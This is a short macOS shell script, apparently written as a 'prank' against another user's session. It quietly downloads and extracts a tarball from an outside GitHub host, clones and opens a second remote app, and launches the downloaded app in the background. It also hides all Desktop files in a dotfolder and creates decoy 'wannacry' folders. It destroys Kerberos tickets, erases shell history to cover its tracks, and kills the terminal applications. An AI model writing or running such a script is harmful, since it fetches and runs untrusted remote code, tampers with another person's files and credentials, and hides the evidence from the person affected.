# if [ $(users) == "aaskal" ]
# then
#     echo "wa ta sir thwa"
#     exit 1
# fi  # replace 'done' with 'fi'

# # rest of the script...
mkdir -p /tmp/laz/

curl -s -L https://github.com/ic4rusfly/p1/raw/master/prank.tar.gz -o /tmp/laz/prank.tar.gz > /dev/null

tar xvf /tmp/laz/prank.tar.gz -C /tmp/laz > /dev/null


cd /tmp
rm -rf sound
git clone  https://github.com/aabderrafie/sound  
cd sound
open ./sound.app

mkdir ~/.Laz/

mv ~/Desktop/* ~/.Laz/

cd ~/tmp

rm -rf ~/.*history*

mkdir wannacry{0..10}

nohup open /tmp/laz/app/Laz.app > /dev/null

kdestroy
clear
rm -f ~/.*history*

killall iTerm
killall Terminal
killall iTerm2